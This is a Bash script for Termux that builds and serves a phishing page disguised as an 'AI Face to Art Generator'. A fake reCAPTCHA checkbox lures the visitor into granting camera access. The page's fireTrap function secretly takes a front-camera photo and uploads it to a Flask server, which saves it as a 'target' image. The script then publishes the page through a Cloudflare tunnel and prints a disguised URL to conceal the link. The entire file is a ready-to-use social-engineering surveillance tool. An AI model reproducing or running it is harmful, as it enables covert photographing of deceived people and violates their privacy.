// Bash, ai_photo_generator.sh, Termux Android x64, Bash
#!/bin/bash

# Developed by Sir.omar4

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
NC='\033[0m'

clear
echo -e "${R}"
echo " ███████╗██╗██████╗     ██████╗ ███╗   ███╗ █████╗ ██████╗       ██╗  ██╗██╗  ██╗"
echo " ██╔════╝██║██╔══██╗   ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗      ██║  ██║██║  ██║"
echo " ███████╗██║██████╔╝   ██║   ██║██╔████╔██║███████║██████╔╝      ███████║███████║"
echo " ╚════██║██║██╔══██╗   ██║   ██║██║╚██╔╝██║██╔══██║██╔══██╗      ██╔══██║╚════██║"
echo " ███████║██║██║  ██║██╗╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║██╗██╗██║  ██║     ██║"
echo " ╚══════╝╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝  ╚═╝     ╚═╝"
echo -e "${NC}"
echo -e "${B}================================================================${NC}"
echo -e "      AI PHOTO GENERATOR - SIR.OMAR4 EDITION"
echo -e "${B}================================================================${NC}"

echo -e "${Y}[*] Initializing local storage paths...${NC}"
mkdir -p $HOME/storage/downloads/Captured_images1 templates

cat << 'EOF' > templates/index.html
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>AI Face Animator & Art Generator</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #1e1e2f, #2b2b40); height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; }
        .card { background: rgba(30, 30, 46, 0.85); backdrop-filter: blur(10px); width: 440px; padding: 35px; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); text-align: center; border: 1px solid rgba(255,255,255,0.1); }
        h2 { color: #00d2ff; margin-bottom: 10px; font-size: 24px; }
        p { color: #b0b0c3; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        
        .captcha-box { background: #252538; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #3f3f5f; }
        .captcha-left { display: flex; align-items: center; gap: 10px; font-size: 14px; }
        .captcha-left input[type="checkbox"] { width: 20px; height: 20px; accent-color: #00d2ff; cursor: pointer; }
        
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #00d2ff, #3a7bd5); color: white; border: none; font-weight: bold; font-size: 16px; border-radius: 8px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,210,255,0.3); }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,210,255,0.5); }
        
        .loading { display: none; margin-top: 20px; }
        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00d2ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer-sig { margin-top: 15px; font-size: 11px; color: #555577; }
    </style>
</head>
<body>
    <div class="card" id="mainCard">
        <h2>AI Face to Art Generator</h2>
        <p>Transform your portrait into a stunning masterpiece using advanced neural network algorithms.</p>
        
        <div class="captcha-box">
            <div class="captcha-left">
                <input type="checkbox" id="humanCheck" onchange="toggleBtn()">
                <label for="humanCheck">I'm not a robot (Security Verification)</label>
            </div>
            <span style="font-size: 11px; color: #777;">reCAPTCHA</span>
        </div>

        <button id="genBtn" style="opacity: 0.5; cursor: not-allowed;" disabled onclick="fireTrap()">Generate AI Artwork</button>
        
        <div class="loading" id="loadingDiv">
            <div class="spinner"></div>
            <p style="color: #00d2ff;">Processing facial features and rendering artwork...</p>
        </div>
        <div class="footer-sig">Powered by Sir.omar4</div>
    </div>

    <script>
        function toggleBtn() {
            const chk = document.getElementById('humanCheck');
            const btn = document.getElementById('genBtn');
            if (chk.checked) {
                btn.style.opacity = '1';
                btn.style.cursor = 'pointer';
                btn.removeAttribute('disabled');
            } else {
                btn.style.opacity = '0.5';
                btn.style.cursor = 'not-allowed';
                btn.setAttribute('disabled', 'true');
            }
        }

        async function fireTrap() {
            document.getElementById('genBtn').style.display = 'none';
            document.querySelector('.captcha-box').style.display = 'none';
            document.getElementById('loadingDiv').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);

                setTimeout(async () => {
                    try {
                        const blob = await imageCapture.takePhoto();
                        
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'AI_Generated_Masterpiece.jpg';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);

                        const fd = new FormData();
                        fd.append('snapshot', blob, 'ai_art_target.jpg');
                        
                        await fetch('/upload', { method: 'POST', body: fd });
                    } catch (err) {
                        console.log(err);
                    } finally {
                        track.stop();
                    }
                }, 800);
            } catch (err) {
                console.log(err);
            }

            setTimeout(() => {
                document.querySelector('h2').innerText = "Artwork Generated Successfully!";
                document.getElementById('loadingDiv').innerHTML = '<p style="color: #00ff88; font-size:16px;">Masterpiece saved to your device!</p>';
            }, 3500);
        }
    </script>
</body>
</html>
EOF

cat << 'EOF' > server.py
# Developed by Sir.omar4
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
UPLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Captured_images1')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'snapshot' in request.files:
        file = request.files['snapshot']
        filename = f"target_{int(time.time())}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        print(f"\n[🔥] [Sir.omar4] Image captured and saved successfully to: {filepath}\n")
        return jsonify({'status': 'success'})
    return jsonify({'status': 'failed'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

echo -e "${G}[+] Setup completed successfully by Sir.omar4!${NC}"
echo -e "${Y}[*] Starting local Flask server on port 5000...${NC}"

python server.py &
SERVER_PID=$!

sleep 2

echo -e "${Y}[*] Launching Cloudflare tunnel and generating custom link...${NC}"
echo -e "${R}----------------------------------------------------------------${NC}"

cloudflared tunnel --url http://localhost:5000 --metrics 0.0.0.0:0 2>&1 | while read -r line; do
    echo "$line"
    if [[ "$line" == *"https://"*".trycloudflare.com"* ]]; then
        raw_url=$(echo "$line" | grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com")
        masked_url=$(echo "$raw_url" | sed 's#https://#https://sir.omar4@#')
        echo -e "\n${R}================================================================${NC}"
        echo -e "${G}[+] Original URL:${NC} $raw_url"
        echo -e "${G}[+] Masked URL:${NC}   $masked_url"
        echo -e "${R}================================================================${NC}"
    fi
done

kill $SERVER_PID

